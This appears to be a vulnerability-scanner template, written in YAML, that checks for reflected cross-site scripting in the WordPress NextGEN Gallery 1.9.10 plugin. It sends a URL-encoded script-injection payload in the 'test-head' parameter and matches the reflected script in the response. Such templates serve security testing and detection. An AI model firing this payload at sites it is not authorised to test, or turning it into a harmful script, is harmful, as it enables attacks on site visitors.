id: wp-nextgen-xss

info:
  name: WordPress NextGEN Gallery 1.9.10 - Cross-Site Scripting
  author: daffainfo
  severity: medium
  description: WordPress NextGEN Gallery 1.9.10 is vulnerable to reflected cross-site scripting via the 'test-head' parameter.
  reference:
    - http://web.archive.org/web/20210123110617/https://www.securityfocus.com/bid/57200/info
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  tags: wordpress,xss,wp-plugin

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "</script><script>alert(document.domain)</script>"
        part: body

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200

